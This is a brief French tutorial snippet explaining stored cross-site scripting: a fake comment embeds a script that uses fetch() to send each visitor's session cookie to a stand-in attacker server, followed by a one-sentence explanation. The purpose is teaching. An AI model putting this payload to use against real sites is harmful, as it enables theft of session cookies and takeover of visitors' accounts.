# XSS Cross-Site Scripting

```html
Super article ! 
<script>
  // Le navigateur de chaque visiteur exécutera ce code :
  fetch('https://serveur-attaquant.example/log?cookie=' + document.cookie);
</script>
```

Dès qu'une victime affiche la page, son navigateur exécute le `<script>` et envoie silencieusement son cookie de session au serveur de l'attaquant.
